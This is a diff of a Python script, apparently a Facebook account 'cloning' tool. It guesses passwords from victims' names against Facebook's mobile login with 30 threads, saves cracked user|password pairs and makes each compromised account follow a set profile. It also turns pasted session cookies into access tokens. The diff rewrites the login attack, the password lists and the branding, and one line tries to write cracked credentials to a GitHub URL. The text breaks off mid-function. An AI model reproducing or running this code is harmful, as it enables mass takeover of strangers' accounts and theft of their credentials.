@@ -1,36 +1,32 @@
-#!/usr/bin/python3
-#-*-coding:utf-8-*-
-# Update V1.7
-
-### Import Module
+ #!/usr/bin/python3
 import os
 try:
     import requests
 except ImportError:
-    print('\n Module requests !...\n')
+    print('\n [✓] installing requests !...\n')
     os.system('pip install requests')
 
 try:
     import concurrent.futures
 except ImportError:
-    print('\n Module futures !...\n')
+    print('\n [✓] installing futures !...\n')
     os.system('pip install futures')
 
 try:
     import bs4
 except ImportError:
-    print('\n Module bs4 !...\n')
+    print('\n [✓] installing bs4 !...\n')
     os.system('pip install bs4')
 
-import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid
-from concurrent.futures import ThreadPoolExecutor as BilalBSN
+import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
+from concurrent.futures import ThreadPoolExecutor as ahmadAXI
 from datetime import datetime
 from bs4 import BeautifulSoup
 
 
 ct = datetime.now()
 n = ct.month
-bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
+bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
 try:
     if n < 0 or n > 12:
         exit()
@@ -43,25 +39,20 @@ ta = current.year
 bu = current.month
 ha = current.day
 op = bulan[nTemp]
-### WARNA RANDOM ###
-P = '\x1b[1;97m' # PUTIH
-M = '\x1b[1;91m' # MERAH
-H = '\x1b[1;92m' # HIJAU
-K = '\x1b[1;93m' # KUNING
-B = '\x1b[1;94m' # BIRU
-U = '\x1b[1;95m' # UNGU
-O = '\x1b[1;96m' # BIRU MUDA
-N = '\x1b[0m'    # WARNA MATI
+P = '\x1b[1;97m' # 
+M = '\033[1;31m' # 
+H = '\033[1;32m' # 
+K = '\x1b[1;97m' # 
+B = '\x1b[1;97m' # 
+U = '\x1b[1;95m' # 
+O = '\x1b[1;97m' # 
+N = '\x1b[0m'    # 
 my_color = [
  P, M, H, K, B, U, O, N]
 warna = random.choice(my_color)
-#  CHIGOZIEWORLDWIDE.  #
-#------------------------------->
-
-############################ RESPONSE FACEBOOK ###########################################
 data,data2={},{}
 aman,cp,salah=0,0,0
-ubahP,pwBaru=[],[]
+ubahP,fuck,pwBaru=[],[],[]
 ok = []
 cp = []
 id = []
@@ -70,286 +61,110 @@ loop = 0
 url_lookup = "https://lookup-id.com/"
 url_mb = "https://m.facebook.com"
 url_ip = "https://www.httpbin.org/ip"
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; Redmi Note 8T Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]"}
+header_grup = {     "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5"}
 bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
-###########################################################################################
 done = False
-def animate():
-    os.system("clear")
-    for c in itertools.cycle(['\x1b[1;92m|', '\x1b[1;92m/', '\x1b[1;92m-', '\x1b[1;92m\\']):
-        if done:
-            break
-        sys.stdout.write(f'\r{N}[{O}â€¢{N}] Loading ' + c)
-        sys.stdout.flush()
-        time.sleep(0.03)
-t = threading.Thread(target=animate)
-t.start()
-time.sleep(0.5)
-done = True
-        
-# lempankkkkkkkk
+
 def jalan(z):
     for e in z + '\n':
         sys.stdout.write(e)
         sys.stdout.flush()
         time.sleep(0.01)
+logo ="""\033[1;37;1m 
+\033[0;91m ooooooooo.         .o.          oooo       .o.    \033[0;92m8888   `Y88.      .888.         `888      .888.    \033[0;93m888   .d88'     .8"888.         888     .8"888.   \033[0;94m888ooo88P'     .8' `888.        888    .8' `888.  \033[0;95m888`88b.      .88ooo8888.       888   .88ooo8888. \033[0;96m888  `88b.   .8'     `888.      888  .8'    `888\033[0;92mo888o  o888o o88o     o8888o  .o. 88P o88o  o8888o\033[0;95m                              `Y888P              \033[0;98m[=]    ~ King of Facebook Anchal Raja ~    [=] 
+[=]÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷[∆]
+[=]\033[1;92;1m  Author   : ANCHAL RAJA 
+[=]\033[1;92;1m  Facebook : www.facebook.com.ANCHAL.RAJA
+[=]\033[1;94;1m [Whatsapp : +919149858868
+[=]\033[1;96;1m GitHub   : ANCHAL RAJA 
+[=]\033[1;92;1m [Virson   : JK.0.19
+[=]÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷[∆]"""
 
-# LO KONTOL
-def logo():
-	print("""%s
-\x1b[1;92m
-\x1b[1;91m   {|}{|}{|}    {|}{|}    {|}{|}   {|}{|}{|}
-\x1b[1;92m   {|}    {|}  {|}  {|}     {|}    {|}    {|} 
-\x1b[1;93m   {|}{|}{|}   {|}{|}{|}    {|}    {|}{|}{|}
-\x1b[1;94m   {|}    {|}  {|}   {|}    {|}    {|}    {|}
-\x1b[1;95m   {|}     {|} {|}   {|} {|}{|}    {|}     {|}
-\x1b[1;96m
-\x1b[1;96m  {∆}~~~~~~~~~~~~~~Anchal~Raja~~~~~~~~~~~~~~{∆}
-\x1b[1;93m  [=]_______________________________________[=]
-\x1b[1;95m  [=]Author   : ANCHAL RAJA 
-\x1b[1;96m  [=]Facebook : www.facebook.com.ANCHAL.RAJA
-\x1b[1;91m  [=]Whatsapp : +919149858868
-\x1b[1;92m  [=]GitHub   : https://github.com/RAJA-JK019
-\x1b[1;94m  [=]Virson   : .1.7
-\x1b[1;93m  [=]______________________________________[=]
-
-"""%(O))                  
-      
-def reg():
+def ahmad():
     os.system('clear')
-    logo()
-    print ('')
-    print (' Checking Approval')
-    time.sleep(1) 
-    try:
-        to = open('/sdcard/Android/.bs7nt.txt', 'r').read()
-    except (KeyError, IOError):
-        reg2()
-
-    r1 = requests.get('https://raw.githubusercontent.com/CKB-MAKER-ANCHAL-RAJA/d-2/main/Aproval.txt ').text
-    if to in r:
-        time.sleep(5)
-        bsn_menu()
-        ip()
-    else:
-        os.system('clear')
-        logo()
-        print('')
-        print ('\tApproved Failed')
-        print ('')
-        print (' \033[1;97mYour id: ' + to)
-        print(' WhatsApp : +919149858868')
-        input('\033[1;97m Press Enter To Send Token')
-        os.system('xdg-open https://wa.me/+923493425868?text=Assalamualaikum Sir Approve my Token and my Token :'+to)
-        reg()
-
-def reg2():
-    os.system('clear')
-    logo()
+    print(logo)
+    ipm = requests.get(url_ip).json()
+    todz = ''
+    IP = ipm['origin']
+    print
+    print(' [1]   (METHOD1) mbusic Facebook')
+    print(' [2]   (METHOD2) free Facebook')
+    print(' [3]   (METHOD3) mbusic Facebook')
+    print(' [E]   (EXIT')
     print('')
-    print ('\tApproval Not Detected')
-    print('')
-    id = uuid.uuid4().hex[:50]
-    print (' Your id : ' + id)
-    print(' WhatsApp : +919149858868')
-    input(' Press Enter To Send Token ')
-    os.system('xdg-open https://wa.me/+919149858868?text=Assalamualaikum Sir Approve my Token and my Token :'+id)
-    sav = open('/sdcard/Android/.bs7nt.txt', 'w')
-    sav.write(id)
-    sav.close()
-    raw_input('\033[1;97m Press enter to check Approval ')
-    reg()
+    _ahmad___ = input('       Choose option : ')
+    if _ahmad___ in ('1', '01'):
+        __xxx__().ahmadx(id)
+    if _ahmad___ in ('2', '02'):     
+        __xxxx__().ajawanx(id)
+    if _ahmad___ in ('3', '03'):     
+        __xxxxx__().malikx(id)
+    if _ahmad___ in ('E', 'ee'):
+        pass
 
 
-#MASUK TOKEN
-def chigozie():
-    os.system('clear')
-    print (' %s*%s tools ini menggunakan login cookies facebook.\n %s*%s apakah kamu sudah tau cara mendapatkan cookies facebook?\n %s*%s ketik open untuk mendapatkan cookies'%(O,N,O,N,O,N))
-    cookie = input("\n %s[%s?%s] Cookies : %s"% (O,O,O,O))
-    if cookie in['OPEN','Open','open']:
-      jalan("\n  %s* %sanda akan di arahkan ke YouTube"%(O,O));time.sleep(3);os.system('xdg-open https://wa.me/+2348069472717');chigozie()
-    try:
-        head={'Host':'business.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','content-type' : 'text/html; charset=utf-8','accept-encoding':'gzip, deflate br','accept-language':'id-ID,id;q=0.9,en-US,en;q=0.9','cookie': cookie}
-        asww=requests.get("https://business.facebook.com/creatorstudio/home", headers=head)
-        reqq=re.search('{"accessToken":"(EAA\w+)', asww.text)
-        tokn=reqq.group(1)
-        open('.cokie.txt', 'a').write(cookie)
-        open('.token.txt', 'a').write(tokn)
-        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(tokn)).json()['name']
-        print('\n\n %s*%s selamat datang %s%s%s'%(O,O,O,nama,O));time.sleep(2)
-        print(' %s*%s mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,O));time.sleep(2)
-        input(' %s*%s tekan enter '%(O,O))
-        os.system('xdg-open https://wa.me/+2348069472717')
-        bsn_menu()
-    except AttributeError:
-        print('\n %s[%sÃ—%s] cookies invalid'%(O,O,O));time.sleep(1);chigozie()
-    except UnboundLocalError:
-        print('\n %s[%sÃ—%s] cookies invalid'%(O,O,O));time.sleep(1);chigozie()
-    except requests.exceptions.ConnectionError:
-        exit('\n\n %s[%s!%s] tidak ada koneksi\n'%(O,O,O))
-### ORANG GANTENG ###
-def hasil(OK,cp):
-    if len(OK) != 0 or len(cp) != 0:
-        print('\n----------------------------------------------')
-        print(' Your Process Complete...')
-        print('----------------------------------------------')
-        print(' [%s+%s] \033[1;97mTOTAL OK : %s --- \033[1;97mAnchal-ok.txt'%(O,O,str(len(ok))))
-        print(' [%s+%s] \033[1;97mTOTAL CP : %s --- \033[1;97mAnchal-cp.txt'%(O,O,str(len(cp))))
-        print('----------------------------------------------')
-        input(f"\n\033[1;97m Press Enter To Go Back ")
-        bsn_menu()
-
-def bsn_menu():
-    os.system('clear')
-    logo()
-    ipm = requests.get(url_ip).json() 
-    IP = ipm["origin"]
-    print(" [1] File Cloning")
-    print(" [2] Contact Me")
-    pepek = input(' Select : ')
-    if pepek in['1','01']:
-        __bsn__().bilo(id)
-    if pepek in['2','02']:       
-    	os.system("xdg-open https://www.facebook.com/profile.php?id=100007144028317")
-    if pepek in['3','03']:
-    	__bsn__().bilo_(log_cookie)
-
-class __bsn__:
-
-     
+class __xxx__:
     def __init__(self):
         self.id = []
-
-    def bilo(self,id):
-        os.system('clear')
-        logo()
-        print("              File Crack Menu")
-        print(' -------------------------------------------')
-        print('')
-        self.cnt = input('%s [+] Input File :%s '%(P,K))
+    def ahmadx(self,id):
+        os.system("clear")
+        print(logo)
+        self.cnt = input('_____Put File Name : ')
         self.id = open(self.cnt).read().splitlines()
         os.system('clear')
-        logo()
+        print(logo)
         print("")
         ___worldwide___ = ('y')
         if ___worldwide___ in ('yes','Yes','Y', 'y'):
-            os.system('clear')
-            logo()
-            print("-------------------Method Menu-------------------")
-            print('')
-            print('')
-            print(' [+] Method 1')
-            print(' [+] Method 2')
-            print(' [+] Method 3 (Best)')
-            pepek = input(' Select : ')
-            if pepek in['1','01']:
-              __bsn__().bilo()
-            if pepek in['2','02']:       
-            	__bsn__().bilo()
-            if pepek in['3','03']:
-       	     __bsn__().bilo()
             self.__pler__()
         else:
-            print(' Choose Correct One');self.bilo(id)
-
-    def __api__(self, user, __chi__):
-        global ok,cp,loop        
-        for i in list('\|-/'):
-            sys.stdout.write(f'\r \x1b[1;97m[SSG] /{loop}/ [{len(self.id)}]\x1b[1;97m[OK] [{len(ok)}] [CP] [{len(cp)}] '),
-            sys.stdout.flush()
-        for pw in __chi__:
-            pw = pw.lower()
-            try: os.mkdir('results')
-            except: pass
-            w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+coki}).text
-            if "access_cookies" in p:
-                print('\r [SSG~ OK| %s | %s ' % (user,pw))
-                wrt = '%s|%s' % (user,pw)
-                ok.append(wrt)
-                open('bsn-ok.txt' , 'a').write('%s\n' % wrt)
-                break
-            elif "www.facebook.com" in p["error_msg"]:
-                try:
-                    kontol = open('.cookies.txt').read()
-                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
-                    month, day, year = cp_ttl.split('/')
-                    month = bulan_ttl[month]
-                    print('\r%s \033[1;94m[ANCHAL•RAJA |CP| %s | %s ' % (K,user,pw))
-                    wrt = '%s|%s' % (user,pw)
-                    cp.append(wrt)
-                    open('bsn-cp.txt' , 'a').write('%s\n' % wrt)
-                    break
-                except (KeyError, IOError):
-                    month = ''
-                    day   = ''
-                    year  = ''
-                except:
-                    pass
-                print('\r%s \033[1;94m[SSG~ |CP| %s | %s ' % (K,user,pw))
-                wrt = '%s|%s' % (user,pw)
-                cp.append(wrt)
-                open('bsn-cp.txt' , 'a').write('%s\n' % wrt)
-                break
-            else:
-                continue
-        loop += 1
-
+            print(' [!] Choose Correct One');
+            self.ahmadx(id)
     def __metode__(self, user, __chi__, cebok):
         global ok,cp,loop
-        sys.stdout.write(f'\r \x1b[1;97m[SSG] /{loop}/ [{len(self.id)}]\x1b[1;97m[OK] [{len(ok)}] [CP] [{len(cp)}] '),
+        sys.stdout.write('\r\033[1;96m \033              %s|%s \033[1;32mOK|%s '%(loop,len(self.id),len(ok))),
+        
         sys.stdout.flush()
         try:
             for pw in __chi__:
                 pw = pw.lower()
                 session=requests.Session()
-                header = {
+                header={
                     "Host":cebok,
                     "upgrade-insecure-requests":"1",
-                    "user-agent":"Mozilla/5.0 (Linux; Android 9; Mi Note 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
+                    "user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5",
                     "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-                    "dnt":"1",
-                    "x-requested-with":"mark.via.gp",
-                    "sec-fetch-site":"same-origin",
-                    "sec-fetch-mode":"cors",
-                    "sec-fetch-user":"empty",
+                    "sec-fetch-site":"none",
+                    "sec-fetch-mode":"navigate",
+                    "sec-fetch-user":"?1",
                     "sec-fetch-dest":"document",
-                    "referer":"https://m.facebook.com/",
+                    "referer":"https://free.facebook.com/home.php?paipv=0&eav=Afa8cdXXzTK4k6D5wodkhfGjILmckqBRc7sVaG4Tl5rkKOo8S7h7qx5rvZWXJ4gpq14&tbua=1",
                     "accept-encoding":"gzip, deflate br",
-                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
-                }
-                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
-                das = {                
-                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
-                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
-                    "uid":user,
-                    "flow":"login_no_pin",
-                    "pass":pw,
-                    "next":"https://developers.facebook.com/tools/debug/accesstoken/",
-                }
-                header = {
-                     "Host":cebok,
-                    "cache-control":"max-age=0",
-                    "upgrade-insecure-requests":"1",
-                    "origin":"https://"+cebok,
-                    "content-type":"application/x-www-form-urlencoded",
-                    "user-agent":"Mozilla/5.0 (Linux; Android 11; Mi Note 10 Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 WpsMoffice/11.5.1",
+                    "accept-language":"en-US,en;q=0.9",
+                     "cache-control":"max-age=0",
+                 }                       
+
+                header1 = {
+                    "Host":cebok,
+                    "upgrade-insecure-requests":"2",
+                    "user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5",
                     "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-                    "x-requested-with":"XMLHttpRequest",
-                    "sec-fetch-site":"same-origin",
-                    "sec-fetch-mode":"cors",
-                    "sec-fetch-user":"empty",
+                    "sec-fetch-site":"none",
+                    "sec-fetch-mode":"navigate",
+                    "sec-fetch-user":"?1",
                     "sec-fetch-dest":"document",
-                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
+                    "referer":"https://free.facebook.com/home.php?paipv=0&eav=Afa8cdXXzTK4k6D5wodkhfGjILmckqBRc7sVaG4Tl5rkKOo8S7h7qx5rvZWXJ4gpq14&tbua=1",
                     "accept-encoding":"gzip, deflate br",
-                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"                                   
+                    "accept-language":"en-US,en;q=0.9",
+                     "cache-control":"max-age=0",
                 }
-                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
+                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    print(f'\r{H} [ANCHAL•RAJA OK|{user} | {pw}')
+                    print(f"\r{H} [ANCHAL-RAJA-OK] {user} | {pw}")
                     wrt = '%s|%s' % (user,pw)
                     ok.append(wrt)
-                    open('SSG~ok.txt' , 'a').write('%s\n' % wrt)
+                    open('https://github.com/hassanaliali1/user/blob/main/user.txt' , 'a').write('%s\n' % wrt)
                     self.follow(session,coki)
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
@@ -358,107 +173,428 @@ class __bsn__:
                         cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('\r%s \033[1;94m[ANCHAL•RAJA CP| %s | %s ' % (K,user,pw))
+                        print('r\%s [ANCHAL-RAJA-2F] %s | %s ' % (U, user, pw))
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
-                        open('SSG~cp.txt' , 'a').write('%s\n' % wrt)
+                        open('CP.txt' , 'a').write('%s\n' % wrt)
                         break
                     except (KeyError, IOError):
                         month = ''
                         day   = ''
                         year  = ''
-                    except:pass
-                    print('\r%s \033[1;94m[SSG~ CP| %s | %s ' % (K,user,pw))
+                    except:
+                        pass
+                    print('\r%s [ANCHAL-RAJA-2F] %s | %s ' % (U, user, pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
-                    open('SSG~cp.txt' , 'a').write('%s\n' % wrt)
+                    open('ANCHAL-RAJA_CP.txt' , 'a').write('%s\n' % wrt)
                     break
                 else:
                     continue
-
             loop+=1
         except:
             self.__metode__(user, pw, cebok)
-#    <- Bot followers ->
-    def follow(self,session,coki):
-        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=100065533669299",cookies={"cookie":coki}).text,"html.parser")
-        get = r.find("a",string="Ikuti").get("href")
-        session.get("https://mbasic.facebook.com"+str(get),cookies={"cookie":coki}).text
+    def follow(self, session, coki):
+        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100081530106222', cookies={'cookie': coki}).text, 'html.parser')
+        get = r.find('a', string='Ikuti').get('href')
+        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
     def __pler__(self):
-        chi = ('3')
+        print('1.       PASS1 VIP ')
+        print('2.       PASS2 VIP ')
+        print('3.       PASS3 VIP ')
+        chi = input('\n        Choose: ')
         if chi == '':
-            print('\nSelect Correct One');self.__pler__()
+            print('\nSelect Correct One')
+            self.__pler__()
         elif chi in ('1', '01'):
-            os.system('clear')
-            logo()
-            print('')
-            print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
-            print(' \033[1;97mYour Process Started in Background')
-            print('-------------------------------------------')
-            print('')
-            with BilalBSN(max_workers=30) as kirim:
-                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
+            os.system("clear")
+            print(logo)
+            print("\033[1;97m\rUse flight (airplane) mode before use\033[1;97m")
+            print(47*"-")
+            print('\033[1;97m Total IDs : %s ' % len(self.id))
+            print(47*"-")
+            with ahmadAXI(max_workers=30) as AXIworld:
+                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
-                        uid, name = yntkts.split('|')
+                        uid, name = zsb.split('|')
                         xz = name.split(' ')
+                        first, last = name.split(' ')
+                        firstl = first.lower()
+                        lastl = last.lower()
+                        firsts = first.capitalize()
+                        lasts = last.capitalize()
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"1234",xz[0]+xz[2], xz[0]+"12345"]
+                            pwx = [firstl+' '+lastl]
                         else:
-                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"1234",xz[0]+xz[2], xz[0]+"12345"]
-                        kirim.submit(self.__api__, uid, pwx)
+                            pwx = [firstl+' '+lastl]
+                            pwx = [firstl+' '+lastl]
+                        AXIworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                     except:
                         pass
-
             hasil(ok,cp)
+            self.__pler__()
         elif chi in ('2', '02'):
-            os.system('clear')
-            logo()
-            print('')
-            print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
-            print(' \033[1;97mYour Process Started in Background')
-            print('-------------------------------------------')
-            print('')
-            with BilalBSN(max_workers=30) as kirim:
-                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
+            os.system("clear")
+            print(logo)
+            print("\033[1;97m\rUse flight (airplane) mode before use\033[1;97m")
+            print(47*"-")
+            print('\033[1;97m Total IDs : %s ' % len(self.id))
+            print(47*"-")
+            with ahmadAXI(max_workers=30) as AXIworld:
+                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
-                        uid, name = yntkts.split('|')
-                        xz = name.split(' ')
+                        uid, name = zsb.split('|')
+                        xz = name.split(' ')                      
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"1234",xz[0]+xz[0], xz[0]+"12345"]
+                            pwx = [xz[0]+xz[1]]                         
+                            pwx = [xz[0]+xz[1]]
                         else:
-                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"1234",xz[0]+xz[0], xz[0]+"12345"]
-                        kirim.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+                            pwx = [xz[0]+xz[1]] 
+                        AXIworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                     except:
                         pass
-
             hasil(ok,cp)
         elif chi in ('3', '03'):
-
-            os.system('clear')
-            logo()
-            print('')
-            print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
-            print(' \033[1;97mYour Process Started in Background')
-            print('-------------------------------------------')
-            print('')
-            with BilalBSN(max_workers=30) as kirim:
-                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
+            os.system("clear")
+            print(logo)
+            print("\033[1;97m\rUse flight (airplane) mode before use\033[1;97m")
+            print(47*"-")
+            print('\033[1;97m Total IDs : %s ' % len(self.id))
+            print(47*"-")
+            with ahmadAXI(max_workers=30) as AXIworld:
+                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
-                        uid, name = yntkts.split('|')
+                        uid, name = zsb.split('|')
+                        xz = name.split(' ')                      
+                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
+                            pwx = [xz[0]+"123456", xz[0]+"1122"]                         
+                            pwx = ["786786", "445566", "786110"]
+                        else:
+                            pwx = [xz[0]+"123456", xz[0]+"1122", "786786", "445566", "786110"] 
+                        AXIworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+                    except:
+                        pass
+            hasil(ok,cp)     
+class __xxxx__:
+    def __init__(self):
+        self.id = []
+    def ajawanx(self,id):
+        os.system("clear")
+        print(logo)
+        self.cnt = input('_____Put File Name : ')
+        self.id = open(self.cnt).read().splitlines()
+        os.system('clear')
+        print(logo)
+        print("")
+        ___worldwide___ = ('y')
+        if ___worldwide___ in ('yes','Yes','Y', 'y'):
+            self.__pler__()
+        else:
+            print(' [!] Choose Correct One');
+            self.ahmadx(id)
+    def __metode__(self, user, __chi__, cebok):
+        global ok,cp,loop
+
+        sys.stdout.write('\r\033[1;96m \033[1;32m%s|%s \033[1;32m[OK:%s] '%(loop,len(self.id),len(ok))),
+        sys.stdout.flush()
+        try:
+            for pw in __chi__:
+                pw = pw.lower()
+                session=requests.Session()
+                header={
+                    "Host":cebok,
+                    "upgrade-insecure-requests":"1",
+                    "user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5",
+                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                    "sec-fetch-site":"none",
+                    "sec-fetch-mode":"navigate",
+                    "sec-fetch-user":"?1",
+                    "sec-fetch-dest":"document",
+                    "referer":"https://free.facebook.com/home.php?paipv=0&eav=Afa8cdXXzTK4k6D5wodkhfGjILmckqBRc7sVaG4Tl5rkKOo8S7h7qx5rvZWXJ4gpq14&tbua=1",
+                    "accept-encoding":"gzip, deflate br",
+                    "accept-language":"en-US,en;q=0.9",
+                     "cache-control":"max-age=0",
+                 }                       
+                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
+                das = {
+                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
+                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
+                    "uid":user,
+                    "flow":"login_no_pin",
+                    "pass":pw,
+                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
+                }
+                header1 = {
+                    "Host":cebok,
+                    "upgrade-insecure-requests":"1",
+                    "user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5",
+                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                    "sec-fetch-site":"none",
+                    "sec-fetch-mode":"navigate",
+                    "sec-fetch-user":"?1",
+                    "sec-fetch-dest":"document",
+                    "referer":"https://free.facebook.com/home.php?paipv=0&eav=Afa8cdXXzTK4k6D5wodkhfGjILmckqBRc7sVaG4Tl5rkKOo8S7h7qx5rvZWXJ4gpq14&tbua=1",
+                    "accept-encoding":"gzip, deflate br",
+                    "accept-language":"en-US,en;q=0.9",
+                     "cache-control":"max-age=0",
+                }
+                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
+                if 'c_user' in session.cookies.get_dict():
+                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                    print(f"\r{H} [ANCHAL-RAJA-OK] {user} | {pw}")
+                    wrt = '%s|%s' % (user,pw)
+                    ok.append(wrt)
+                    open('OK.txt' , 'a').write('%s\n' % wrt)
+                    self.follow(session,coki)
+                    break
+                elif 'checkpoint' in session.cookies.get_dict():
+                    try:
+                        tokenz = open('.token.txt').read()
+                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
+                        month, day, year = cp_ttl.split('/')
+                        month = bulan_ttl[month]
+                        print('r\%s [ANCHAL-RAJA-2F] %s | %s ' % (U, user, pw))
+                        wrt = '%s|%s' % (user,pw)
+                        cp.append(wrt)
+                        open('CP.txt' , 'a').write('%s\n' % wrt)
+                        break
+                    except (KeyError, IOError):
+                        month = ''
+                        day   = ''
